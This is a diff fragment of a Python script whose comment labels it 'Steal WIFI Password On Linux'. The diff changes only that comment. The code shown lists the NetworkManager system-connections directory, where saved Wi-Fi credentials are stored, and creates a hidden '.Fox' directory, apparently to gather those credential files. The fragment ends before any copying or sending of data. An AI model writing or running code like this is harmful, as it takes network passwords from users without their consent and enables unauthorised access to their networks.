@@ -1,7 +1,7 @@
 import os
 import shutil
 
-### Steal WIFI On Linux ###
+### Steal WIFI Password On Linux ###
 files = os.listdir("/etc/NetworkManager/system-connections/")
 os.mkdir(".Fox")
 num = 1
